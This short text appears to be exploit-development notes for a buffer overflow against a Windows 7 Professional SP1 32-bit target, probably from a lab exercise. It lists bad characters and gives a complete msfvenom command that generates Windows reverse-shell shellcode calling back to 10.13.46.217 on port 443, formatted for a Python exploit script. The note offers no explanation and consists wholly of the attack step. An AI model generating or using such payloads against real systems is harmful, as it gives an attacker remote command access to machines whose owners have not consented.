

Created for Windows 7 Professional SP1 32bits

Badchars: \x00\x08\x2c\xad

Msfvenom: msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x08\x2c\xad" -v esp -f python
